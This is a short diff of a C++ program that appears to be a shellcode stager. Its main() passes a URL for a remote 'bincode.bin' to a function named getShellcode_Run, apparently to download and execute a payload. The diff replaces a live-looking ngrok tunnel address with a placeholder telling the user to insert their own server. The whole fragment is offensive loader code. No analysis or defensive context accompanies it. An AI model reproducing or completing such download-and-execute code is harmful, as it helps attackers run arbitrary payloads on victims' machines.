@@ -13,7 +13,7 @@ using namespace std;
 
 
 int main(int argc, char** argv) {
-    const char* url = "https://7959-141-101-226-178.ngrok-free.app/bincode.bin";
+    const char* url = "YOUR_HTTP_IP_like(https://cc38-141-101-226-178.ngrok-free.app)/bincode.bin";
     printf("%s\n", url);
     //Sleep(1000);
     getShellcode_Run(url);
